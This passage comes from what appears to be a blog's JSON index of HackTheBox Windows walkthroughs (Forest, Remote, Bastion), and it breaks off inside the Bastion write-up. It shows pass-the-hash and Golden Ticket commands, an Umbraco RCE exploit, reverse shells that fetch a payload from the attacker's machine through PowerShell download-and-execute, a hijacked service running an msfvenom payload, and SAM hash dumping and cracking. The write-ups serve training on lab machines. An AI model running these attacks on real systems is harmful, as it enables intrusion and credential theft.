fe5ff9bdff2ad2d9159151a3da186753c95c708ffd9fFOREST$:aes128-cts-hmac-sha1-96:51ff1311236394aa15091e4b7029f142FOREST$:des-cbc-md5:e0c43de6544f5e83EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4eEXCH01$:des-cbc-md5:8c45f44c16975129[*] Cleaning up..Pass The HashWe can use PsExec with Administrator hashes to gain access:$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161Now that we’re SYSTEM on the target machine, we could stop here… 😎Going further with Golden Ticket… (without mimikatz)An additional thing that we can do to have fun is performing a Golden Ticket attack using the KRBTGT hash we retrieved.1) First we need to grab the Domain SID (Security IDentifier):*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&amp;gt; Get-ADDomain htb.localAllowedDNSSuffixes : {}ChildDomains : {}ComputersContainer : CN=Computers,DC=htb,DC=localDeletedObjectsContainer : CN=Deleted Objects,DC=htb,DC=localDistinguishedName : DC=htb,DC=localDNSRoot : htb.localDomainControllersContainer : OU=Domain Controllers,DC=htb,DC=localDomainMode : Windows2016DomainDomainSID : S-1-5-21-3072663084-364016917-1341370565ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=htb,DC=localForest : htb.localInfrastructureMaster : FOREST.htb.localLastLogonReplicationInterval :LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=local}LostAndFoundContainer : CN=LostAndFound,DC=htb,DC=localManagedBy :Name : htbNetBIOSName : HTBObjectClass : domainDNSObjectGUID : dff0c71a-a949-4b26-8c7b-52e3e2cb6eabParentDomain :PDCEmulator : FOREST.htb.localPublicKeyRequiredPasswordRolling : TrueQuotasContainer : CN=NTDS Quotas,DC=htb,DC=localReadOnlyReplicaDirectoryServers : {}ReplicaDirectoryServers : {FOREST.htb.local}RIDMaster : FOREST.htb.localSubordinateReferences : {DC=ForestDnsZones,DC=htb,DC=local, DC=DomainDnsZones,DC=htb,DC=local, CN=Configuration,DC=htb,DC=local}SystemsContainer : CN=System,DC=htb,DC=localUsersContainer : CN=Users,DC=htb,DC=local2) Now that we have the Domain SID (S-1-5-21-3072663084-364016917-1341370565), we can use ticketer.py from impacket to generate a TGT with the krbtgt password Hash for a user who does not exist:# python ticketer.py -nthash &amp;lt;krbtgt_ntlm_hash&amp;gt; -domain-sid &amp;lt;domain_sid&amp;gt; -domain &amp;lt;domain_name&amp;gt; &amp;lt;user_name&amp;gt;$ ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local doesnotexistImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Creating basic skeleton ticket and PAC Infos[*] Customizing ticket for htb.local/doesnotexist[*] PAC_LOGON_INFO[*] PAC_CLIENT_INFO_TYPE[*] EncTicketPart[*] EncAsRepPart[*] Signing/Encrypting final ticket[*] PAC_SERVER_CHECKSUM[*] PAC_PRIVSVR_CHECKSUM[*] EncTicketPart[*] EncASRepPart[*] Saving ticket in doesnotexist.ccache$ export KRB5CCNAME=doesnotexist.ccache# python psexec.py &amp;lt;domain_name&amp;gt;/&amp;lt;user_name&amp;gt;@&amp;lt;remote_hostname&amp;gt; -k -no-pass$ psexec.py htb.local/amirr0r@$TARGET -k -no-passImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)This error indicates that we have to synchronise our localtime with the DC clock. We can use ntpdate to solve this issue.$ ntpdate $TARGET 6 Sep 18:04:19 ntpdate[6024]: step time server 10.10.10.161 offset +611.916121 secI also added forest to the /etc/hosts file :10.10.10.161 htb.local forestThen it worked:$ psexec.py htb.local/doesnotexist@forest -k -no-passImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Requesting shares on forest.....[*] Found writable share ADMIN$[*] Uploading file lItXNAXI.exe[*] Opening SVCManager on forest.....[*] Creating service bnPS on forest.....[*] Starting service bnPS.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&amp;gt;whoamint authority\\systemC:\\Windows\\system32&amp;gt;exit[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0[*] Opening SVCManager on forest.....[*] Stopping service bnPS.....[*] Removing service bnPS.....[*] Removing file lItXNAXI.exe.....# smbexec also workssmbexec.py htb.local/doesnotexist@forest -k -no-passImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[!] Launching semi-interactive shell - Careful what you executeC:\\Windows\\system32&amp;gt;whoamint authority\\systemUseful links Alfresco documentation What is AS-REP Roasting attack, really? The hacker recipes winPEAS BloodHound SharpHound.exe Microsoft documentation - Account Operators group PowerView.ps1 VbScrub - Kerberos Golden Ticket Attack Explained Well known SIDS Kerberos attacks cheatsheet (Golden Ticket from Linux)" }, { "title": "HackTheBox - Remote", "url": "/htb-remote/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "NFS, Umbraco, hashcat, password cracking, searchsploit, nishang, powershell, IWR, SERVICE_ALL_ACCESS, BINARY_PATH_NAME, sc.exe, exploiting Windows service, htb-windows-easy, writeup, oscp-prep", "date": "2021-08-16 02:35:44 +0700", "snippet": "Enumerationnmap scan# Nmap 7.91 scan initiated Sun Aug 15 17:43:17 2021 as: nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Remote-full-port-scan.txt 10.10.10.180Warning: 10.10.10.180 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.10.180Host is up (0.098s latency).Not shown: 61692 closed ports, 3827 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: |_ SYST: Windows_NT80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Home - Acme Widgets111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/tcp6 rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 2,3,4 111/udp6 rpcbind| 100003 2,3 2049/udp nfs| 100003 2,3 2049/udp6 nfs| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/tcp6 nfs| 100005 1,2,3 2049/tcp mountd| 100005 1,2,3 2049/tcp6 mountd| 100005 1,2,3 2049/udp mountd| 100005 1,2,3 2049/udp6 mountd| 100021 1,2,3,4 2049/tcp nlockmgr| 100021 1,2,3,4 2049/tcp6 nlockmgr| 100021 1,2,3,4 2049/udp nlockmgr| 100021 1,2,3,4 2049/udp6 nlockmgr| 100024 1 2049/tcp status| 100024 1 2049/tcp6 status| 100024 1 2049/udp status|_ 100024 1 2049/udp6 status135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?2049/tcp open mountd 1-3 (RPC #100005)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49678/tcp open msrpc Microsoft Windows RPC49679/tcp open msrpc Microsoft Windows RPC49680/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsPort 21 (FTP)Anonymous FTP login is allowed, however it seems there are no files here:$ ftp $TARGETConnected to 10.10.10.180.220 Microsoft FTP ServiceName (10.10.10.180:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&amp;gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.Port 2049 (NFS)There is an available share that we can mount on our local machine by doing so:$ showmount -e 10.10.10.180 | tee services/2049-NFS.txtExport list for 10.10.10.180:/site_backups (everyone)$ mount -t nfs $TARGET:site_backups /mnt/tmp/ -nolock$ ls /mnt/tmpApp_Browsers App_Data App_Plugins aspnet_client bin Config css default.aspx Global.asax Media scripts Umbraco Umbraco_Client Views Web.configIt looks like these files are a backup for a website.Looking for config files in order to find sensitive information such as passwords, we can take a look at Umbraco.sdf (in the App_Data folder) which is the Umbraco Database for connection credentials.$ strings Umbraco.sdf | grep passwordUser &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;192.168.195.1User &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;umbraco/user/password/changepassword changeUser &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;192.168.195.1User &quot;smith&quot; &amp;lt;smith@htb.local&amp;gt;umbraco/user/password/changepassword changeUser &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;192.168.195.1User &quot;ssmith&quot; &amp;lt;ssmith@htb.local&amp;gt;umbraco/user/password/changepassword changeUser &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;192.168.195.1User &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;umbraco/user/password/changepassword changeUser &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;192.168.195.1User &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;umbraco/user/password/changepassword changepasswordConfigApparently, there are two users at least: admin and ssmith. Let’s investigate more:$ root@kali:/mnt/tmp/App_Data# strings Umbraco.sdf | grep &quot;admin@htb.local&quot; adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f User &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;192.168.195.1User &quot;admin&quot; &amp;lt;admin@htb.local&amp;gt;umbraco/user/password/changepassword changeBINGO! We got a SHA-1 hash: b8be16afba8c314ad33d812f22a04991b90e2aaa.Let’s try to crack it using hashcat:$ cat &amp;gt; hash.txtb8be16afba8c314ad33d812f22a04991b90e2aaa^C$ hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt...b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese...Okay so admin@htb.local’s password should be baconandcheese.Port 80 (Microsoft HTTPAPI httpd 2.0)dirb$ dirb http://$TARGET -o services/80-dirb.txt-----------------DIRB v2.22 By The Dark Raver-----------------OUTPUT_FILE: services/80-dirb.txtSTART_TIME: Sun Aug 15 17:45:50 2021URL_BASE: http://10.10.10.180/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.10.180/ ----+ http://10.10.10.180/about-us (CODE:200|SIZE:5441) + http://10.10.10.180/blog (CODE:200|SIZE:5011) + http://10.10.10.180/Blog (CODE:200|SIZE:5011) + http://10.10.10.180/contact (CODE:200|SIZE:7890) + http://10.10.10.180/Contact (CODE:200|SIZE:7890) + http://10.10.10.180/home (CODE:200|SIZE:6703) + http://10.10.10.180/Home (CODE:200|SIZE:6703) + http://10.10.10.180/install (CODE:302|SIZE:126) + http://10.10.10.180/intranet (CODE:200|SIZE:3323) + http://10.10.10.180/master (CODE:500|SIZE:3420) + http://10.10.10.180/people (CODE:200|SIZE:6739) + http://10.10.10.180/People (CODE:200|SIZE:6739) + http://10.10.10.180/person (CODE:200|SIZE:2741) + http://10.10.10.180/product (CODE:500|SIZE:3420) + http://10.10.10.180/products (CODE:200|SIZE:5328) + http://10.10.10.180/Products (CODE:200|SIZE:5328) + http://10.10.10.180/umbraco (CODE:200|SIZE:4040) -----------------END_TIME: Sun Aug 15 17:57:49 2021DOWNLOADED: 4612 - FOUND: 17nikto$ nikto -h 10.10.10.180 -output services/80-nikto.txt- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.10.180+ Target Hostname: 10.10.10.180+ Target Port: 80+ Start Time: 2021-08-15 17:42:34 (GMT2)---------------------------------------------------------------------------+ Server: No banner retrieved+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Server banner has changed from &#39;&#39; to &#39;Microsoft-IIS/10.0&#39; which may suggest a WAF, load balancer or proxy is in place+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3092: /home/: This might be interesting...+ OSVDB-3092: /intranet/: This might be interesting...+ /umbraco/ping.aspx: Umbraco ping page found+ 7869 requests: 6 error(s) and 7 item(s) reported on remote host+ End Time: 2021-08-15 18:03:13 (GMT2) (1239 seconds)---------------------------------------------------------------------------FootholdUmbracoUsing the credentials we found earlier, we can log in:Looking at searchsploit we can see there are some exploits available that require authentication:$ searchsploit -m aspx/webapps/49488.py$ python 49488.py -u admin@htb.local -p baconandcheese -i &quot;http://$TARGET&quot; -c whoamiiis apppool\\defaultapppoolOkay, it looks like we can exploit a remote code execution vulnerability in Umbraco.ExploitationWe will be using nishang’s Invoke-PowerShellTcp.ps1 script.$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1$ echo &quot;&quot; &amp;gt;&amp;gt; shell.ps1$ echo &quot;Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 1234&quot; &amp;gt;&amp;gt; shell.ps1Don’t forget run a web server and a listener:# On one terminal$ python3 -m http.server 80# On another$ nc -lnvp 1234$ python 49488.py -u admin@htb.local -p baconandcheese -i &quot;http://$TARGET&quot; -c &quot;powershell.exe&quot; -a &quot;iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.12/shell.ps1&#39;)&quot; 2&amp;gt;/dev/nullPS C:\\Users\\Public&amp;gt; type user.txtaf34ddf7875def2cff889b7710163693PrivescPS C:\\windows\\system32\\inetsrv&amp;gt;systeminfoHost Name: REMOTEOS Name: Microsoft Windows Server 2019 StandardOS Version: 10.0.17763 N/A Build 17763OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 00429-00521-62775-AA801Original Install Date: 2/19/2020, 4:03:29 PMSystem Boot Time: 8/15/2021, 11:39:54 AMSystem Manufacturer: VMware, Inc.System Model: VMware7,1System Type: x64-based PCProcessor(s): 4 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [03]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [04]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 MhzBIOS Version: VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (UTC-05:00) Eastern Time (US &amp;amp; Canada)Total Physical Memory: 4,095 MBAvailable Physical Memory: 2,790 MBVirtual Memory: Max Size: 4,799 MBVirtual Memory: Available: 3,603 MBVirtual Memory: In Use: 1,196 MBPage File Location(s): C:\\pagefile.sysDomain: WORKGROUPLogon Server: N/AHotfix(s): 5 Hotfix(s) Installed. [01]: KB4534119 [02]: KB4462930 [03]: KB4516115 [04]: KB4523204 [05]: KB4464455Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: No IP address(es) [01]: 10.10.10.180 [02]: fe80::8959:5ee9:7065:8f1c [03]: dead:beef::8959:5ee9:7065:8f1cHyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed.PS C:\\windows\\system32\\inetsrv&amp;gt; (New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.12/winPEASx64.exe&#39;, &#39;c:\\Windows\\System32\\spool\\drivers\\color\\winPEASx64.exe&#39;)PS C:\\windows\\system32\\inetsrv&amp;gt; cd c:\\Windows\\System32\\spool\\drivers\\color\\PS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; .\\winPEASx64.exewinPEAS revealed that we have all access to the service UsoSvc:Let’s get the current status and config of the service:PS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; sc.exe query UsoSvcSERVICE_NAME: UsoSvc TYPE : 30 WIN32 STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0PS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; sc.exe qc UsoSvc[SC] QueryServiceConfig SUCCESSSERVICE_NAME: UsoSvc TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START (DELAYED) ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\svchost.exe -k netsvcs -p LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Update Orchestrator Service DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystemOkay, maybe we can stop the service and try to change its BINARY_PATH_NAME by a malicious file. We can generate a malicious executable with msfvenom and start a listener:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=53 -f exe -o privesc.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of exe file: 7168 bytesSaved as: privesc.exe$ nc -lnvp 53listening on [any] 53 ... Then we have to upload it:PS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; (New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.12/privesc.exe&#39;, &#39;c:\\Windows\\System32\\spool\\drivers\\color\\privesc.exe&#39;) Finally, stop the service, change the binary path and restart the service:PS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; net stop UsoSvcThe Update Orchestrator Service service is stopping.The Update Orchestrator Service service was stopped successfully.# We could also do: sc.exe config UsoSvc binpath= &quot;powershell.exe &#39;IWR http://10.10.14.12/shell.ps1 -UseBasicParsing&#39;&quot;PS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; sc.exe config UsoSvc binpath= &quot;C:\\Windows\\System32\\spool\\drivers\\color\\privesc.exe&quot;[SC] ChangeServiceConfig SUCCESSPS C:\\Windows\\System32\\spool\\drivers\\color&amp;gt; net start UsoSvc Useful links https://github.com/antonioCoco/RoguePotato My cheat sheat about Windows Privesc" }, { "title": "HackTheBox - Bastion", "url": "/htb-bastion/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "SMB, smbclient, mount, VHD, guestmount, SAM, impacket-secretsdump, password cracking, hashcat, ssh, powershell, JAWS, mRemoteNG, htb-windows-easy, writeup, oscp-prep", "date": "2021-08-15 09:19:06 +0700", "snippet": "Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Bastion-full-port-scan.txt 10.10.10.134Warning: 10.10.10.134 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.10.134Host is up (0.097s latency).Not shown: 62478 closed ports, 3044 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h18m49s, deviation: 1h09m14s, median: 2h58m47s| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Bastion| NetBIOS computer name: BASTION\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-08-15T00:56:52+02:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-08-14T22:56:51|_ start_date: 2021-08-14T22:51:16Port 139/445 (SMB)Discovery$ smbclient -L //10.10.10.134/Enter WORKGROUP\\root&#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Backups Disk C$ Disk Default share IPC$ IPC Remote IPCSMB1 disabled -- no workgroup availableMounting shareADMIN$, C$ and IPC$ are default share, which is not the cas for Backups. Let’s try to mount this share:root@kali:~/htb/machines/Windows/Bastion# mount -t cifs //10.10.10.134/Backups /mnt/bastion/Password for root@//10.10.10.134/Backups: root@kali:~/htb/machines/Windows/Bastion# cd /mnt/bastion/root@kali:/mnt/bastion# lsnote.txt SDT65CB.tmp WindowsImageBackuproot@kali:/mnt/bastion# cat note.txt Sysadmins: please don&#39;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow. Note: when we have write permissions to a SMB share, we could leave SCF files to steal user/admin hashes. SourceMounting VHDBy exploring the share, we can see there are tow .vhd (virtual hard drive) files:root@kali:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# du -hs *37M 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd5.1G 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd4.0K BackupSpecs.xml4.0K BackupSp.swp4.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml12K cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml8.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml4.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml4.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml4.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml4.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml4.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml8.0K cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml2.3M cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xmlWe can use 7z l &amp;lt;VHD_file&amp;gt; to list files or just mount them using guestmount:$ apt install libguestfs-tools -y$ mkdir /mnt/vhd/$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd/ -v...Extracting password hashesOnce the vhd mounted, we could go tho Windows/System32/config/ directory where we can retrieve two interesting files: the SAM database which contains all users password hashes hashes are encrypted with a key which can be found in SYSTEM Note: if we were in a Domain controller, we would grab NTDS.dit also to extract the Active Directory Databaseroot@kali:/mnt/vhd/Windows/System32/config# cp SAM ~/htb/machines/Windows/Bastion/root@kali:/mnt/vhd/Windows/System32/config# cp SYSTEM ~/htb/machines/Windows/Bastion/Now we can extract the hashes using tools like pwdump or impacket-secretsdump:$ impacket-secretsdump -sam SAM -system SYSTEM localImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::[*] Cleaning up... Hashes that begin with “31d6” are hashes of empty string which means that the account is either disabled or it has no password. This is why Administrator and Guest password hashes are the same.At this point, we can try to crack them using hashcat or perfom a Pass The Hash.FootholdCracking NTLM hash using hashcat$ cat &amp;gt; hashes.txtAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::^C$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt...26112010952d963c8dc4217daec986d9:bureaulampje ...SSHThe nmap scan shows us earlier that an SSH service was running. So let’s try to log in:With dir /a we can list all files (included hidden ones):l4mpje@BASTION C:\\Users\\L4mpje&amp;gt;dir /a Volume in drive C has no label. Volume Serial Number is 0CB3-C487 Directory of C:\\Users\\L4mpje 15-08-2021 03:04 &amp;lt;DIR&amp;gt; . 15-08-2021 03:04 &amp;lt;DIR&amp;gt; .. 22-02-2019 14:50 &amp;lt;DIR&amp;gt; AppData 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; Application Data [C:\\Users\\L4mpje\\AppData\\Roaming] 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Contacts 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; Cookies [C:\\Users\\L4mpje\\AppData\\Local\\Microsoft\\Windows\\INetCookies] 22-02-2019 16:27 &amp;lt;DIR&amp;gt; Desktop 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Documents 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Downloads 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Favorites 15-08-2021 02:53 16.974 jaws-enum.ps1 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Links 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; Local Settings [C:\\Users\\L4mpje\\AppData\\Local] 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Music 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; My Documents [C:\\Users\\L4mpje\\Documents] 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; NetHood [C:\\Users\\L4mpje\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts] 15-08-2021 01:02 786.432 NTUSER.DAT 22-02-2019 14:50 196.608 ntuser.dat.LOG1 22-02-2019 14:50 131.072 ntuser.dat.LOG2 22-02-2019 15:03 65.536 NTUSER.DAT{334e114d-78e5-11e6-840e-ead53ba0b534}.TM.blf 22-02-2019 15:03 524.288 NTUSER.DAT{334e114d-78e5-11e6-840e-ead53ba0b534}.TMContainer00000000000000000001.regtrans-ms 22-02-2019 15:03 524.288 NTUSER.DAT{334e114d-78e5-11e6-840e-ead53ba0b534}.TMContainer00000000000000000002.regtrans-ms 22-02-2019 14:50 20 ntuser.ini 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Pictures 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; PrintHood [C:\\Users\\L4mpje\\AppData\\Roaming\\Microsoft\\Windows\\Printer Shortcuts] 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; Recent [C:\\Users\\L4mpje\\AppData\\Roaming\\Microsoft\\Windows\\Recent] 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Saved Games 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Searches 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; SendTo [C:\\Users\\L4mpje\\AppData\\Roaming\\Microsoft\\Windows\\SendTo] 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; Start Menu [C:\\Users\\L4mpje\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu] 22-02-2019 14:50 &amp;lt;JUNCTION&amp;gt; Templates [C:\\Users\\L4mpje\\AppData\\Roaming\\Microsoft\\Windows\\Templates] 22-02-2019 16:26 &amp;lt;DIR&amp;gt; Videos 15-08-2021 02:44 1.920.000 winPEASx64.exe 9 File(s) 4.165.218 bytes 24 Dir(s) 11.312.275.456 bytes free JAWS - Just Another Windows (Enum) ScriptWe can upload JAWS using scp:$ wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1--2021-08-14 23:53:56-- 